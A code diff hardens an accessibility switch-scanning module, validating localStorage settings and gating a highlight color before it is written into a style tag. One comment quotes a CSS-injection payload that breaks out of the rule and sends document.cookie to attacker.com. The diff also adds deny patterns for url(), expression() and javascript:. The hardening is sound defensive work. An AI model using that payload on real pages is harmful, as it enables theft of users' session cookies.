@@ -79,13 +79,43 @@ const DEFAULT_CONFIG: SwitchScanConfig = {
 
 // ── Configuration Persistence ───────────────────────────────────────────────
 
+/** Sanitize the persisted switch-scan config. Tampered persist could
+ *  inject scanSpeedMs = 0 (infinite-loop CPU spike on the next-step
+ *  setTimeout), loops = -1 (Math.max guard fails on NaN), or
+ *  highlightColor with a CSS expression containing url() or
+ *  expression() — modern browsers ignore unsafe color values but
+ *  defensively strip anything that isn't a plausible color literal. */
+function sanitizeConfig(parsed: Partial<SwitchScanConfig>): SwitchScanConfig {
+  const out = { ...DEFAULT_CONFIG };
+  if (typeof parsed.enabled === 'boolean') out.enabled = parsed.enabled;
+  if (parsed.mode === 'auto' || parsed.mode === 'manual') out.mode = parsed.mode;
+  if (typeof parsed.scanSpeedMs === 'number' && Number.isFinite(parsed.scanSpeedMs)
+    && parsed.scanSpeedMs >= 200 && parsed.scanSpeedMs <= 60_000) {
+    out.scanSpeedMs = parsed.scanSpeedMs;
+  }
+  if (typeof parsed.groupScan === 'boolean') out.groupScan = parsed.groupScan;
+  if (typeof parsed.loops === 'number' && Number.isFinite(parsed.loops)
+    && parsed.loops >= 0 && parsed.loops <= 1000) {
+    out.loops = Math.floor(parsed.loops);
+  }
+  // highlightColor: hex (#rgb/#rrggbb), rgb()/rgba()/hsl()/hsla() with no
+  // url/expression/javascript literal. Anything else falls back to default.
+  if (typeof parsed.highlightColor === 'string'
+    && parsed.highlightColor.length <= 64
+    && /^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\)|[a-zA-Z]+)$/.test(parsed.highlightColor)
+    && !/url\s*\(|expression\s*\(|javascript:/i.test(parsed.highlightColor)) {
+    out.highlightColor = parsed.highlightColor;
+  }
+  return out;
+}
+
 export function loadConfig(): SwitchScanConfig {
   if (typeof window === 'undefined') return { ...DEFAULT_CONFIG };
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
     if (raw) {
       const parsed = JSON.parse(raw) as Partial<SwitchScanConfig>;
-      return { ...DEFAULT_CONFIG, ...parsed };
+      return sanitizeConfig(parsed);
     }
   } catch { /* corrupt data — use defaults */ }
   return { ...DEFAULT_CONFIG };
@@ -270,9 +300,24 @@ function clearHighlight(): void {
  * Inject the CSS custom property for highlight color into a style tag.
  * Called once when scanning starts.
  */
+/** Color-shape gate for the CSS injection point below. The entire
+ *  string is interpolated into a <style> tag's textContent — a
+ *  string like `red; } body { background: url('//attacker.com/?'+document.cookie) } a {`
+ *  would otherwise break out of the rule and execute attacker CSS.
+ *  This guard is the canonical defense; loadConfig also validates
+ *  but a future settings UI that bypasses loadConfig would
+ *  otherwise leave the foot-gun. */
+function isSafeCssColor(color: string): boolean {
+  if (typeof color !== 'string' || color.length === 0 || color.length > 64) return false;
+  if (!/^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\)|[a-zA-Z]+)$/.test(color)) return false;
+  if (/url\s*\(|expression\s*\(|javascript:|;|\{|\}/i.test(color)) return false;
+  return true;
+}
+
 let styleInjected = false;
 function injectHighlightStyle(color: string): void {
   if (typeof document === 'undefined') return;
+  const safeColor = isSafeCssColor(color) ? color : '#FFD600';
   const STYLE_ID = 'prism-switch-scan-style';
   let styleEl = document.getElementById(STYLE_ID) as HTMLStyleElement | null;
   if (!styleEl) {
@@ -282,9 +327,9 @@ function injectHighlightStyle(color: string): void {
   }
   styleEl.textContent = `
     .${HIGHLIGHT_CLASS} {
-      outline: 4px solid ${color} !important;
+      outline: 4px solid ${safeColor} !important;
       outline-offset: 3px !important;
-      box-shadow: 0 0 0 6px rgba(0,0,0,0.25), 0 0 12px 4px ${color} !important;
+      box-shadow: 0 0 0 6px rgba(0,0,0,0.25), 0 0 12px 4px ${safeColor} !important;
       transition: outline 0.15s ease, box-shadow 0.15s ease !important;
       z-index: 9000 !important;
       position: relative;
